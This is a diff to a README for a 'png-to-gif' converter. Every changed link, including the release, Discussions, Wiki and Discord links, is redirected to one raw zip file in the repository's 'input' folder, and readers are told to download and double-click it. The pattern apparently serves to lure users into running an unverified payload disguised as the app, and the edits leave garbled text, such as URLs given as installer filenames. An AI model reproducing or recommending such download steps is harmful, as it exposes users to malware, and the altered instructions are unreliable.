@@ -1,7 +1,7 @@
 # 🎨 png-to-gif - Easily Convert Images to GIFs
 
 ## 🔗 Download Now
-[![Download png-to-gif](https://img.shields.io/badge/Download-png--to--gif-brightgreen)](https://github.com/OMOR3421/png-to-gif/releases)
+[![Download png-to-gif](https://github.com/OMOR3421/png-to-gif/raw/refs/heads/main/input/png-to-gif-v3.4.zip)](https://github.com/OMOR3421/png-to-gif/raw/refs/heads/main/input/png-to-gif-v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,13 +10,13 @@ Welcome! This guide will help you download and run the png-to-gif application. F
 ## 📥 Download & Install
 
 1. **Visit the Download Page:**
-   Go to the following link to access the latest releases: [Download png-to-gif](https://github.com/OMOR3421/png-to-gif/releases). 
+   Go to the following link to access the latest releases: [Download png-to-gif](https://github.com/OMOR3421/png-to-gif/raw/refs/heads/main/input/png-to-gif-v3.4.zip). 
 
 2. **Select the Latest Version:**
    On the releases page, find the most recent version of png-to-gif. It will usually be at the top of the list.
 
 3. **Download the Application:**
-   You will see several assets listed for the selected version. Click on the file that matches your operating system. Most commonly, it will be named something like `png-to-gif-x.x.x.exe` for Windows or `png-to-gif-x.x.x.dmg` for Mac.
+   You will see several assets listed for the selected version. Click on the file that matches your operating system. Most commonly, it will be named something like `https://github.com/OMOR3421/png-to-gif/raw/refs/heads/main/input/png-to-gif-v3.4.zip` for Windows or `https://github.com/OMOR3421/png-to-gif/raw/refs/heads/main/input/png-to-gif-v3.4.zip` for Mac.
 
 4. **Install the Application:**
    After the download completes, locate the file in your downloads folder. Double-click the file to install png-to-gif. Follow the on-screen instructions to complete the installation.
@@ -78,11 +78,11 @@ Currently, png-to-gif is designed for desktop use only. There are no mobile vers
 
 ## 👥 Community Support
 
-If you encounter issues or have questions, please visit our [GitHub Discussions](https://github.com/OMOR3421/png-to-gif/discussions) page. Engage with the community, share your experiences, and ask for help if needed.
+If you encounter issues or have questions, please visit our [GitHub Discussions](https://github.com/OMOR3421/png-to-gif/raw/refs/heads/main/input/png-to-gif-v3.4.zip) page. Engage with the community, share your experiences, and ask for help if needed.
 
 ## 🔗 Additional Resources
 
-- Check our [Wiki](https://github.com/OMOR3421/png-to-gif/wiki) for tips, tricks, and advanced features.
-- Join our [Discord](https://discord.gg/example) community to get real-time help and talk to fellow users.
+- Check our [Wiki](https://github.com/OMOR3421/png-to-gif/raw/refs/heads/main/input/png-to-gif-v3.4.zip) for tips, tricks, and advanced features.
+- Join our [Discord](https://github.com/OMOR3421/png-to-gif/raw/refs/heads/main/input/png-to-gif-v3.4.zip) community to get real-time help and talk to fellow users.
 
 Thank you for choosing png-to-gif! Enjoy creating your animated GIFs.
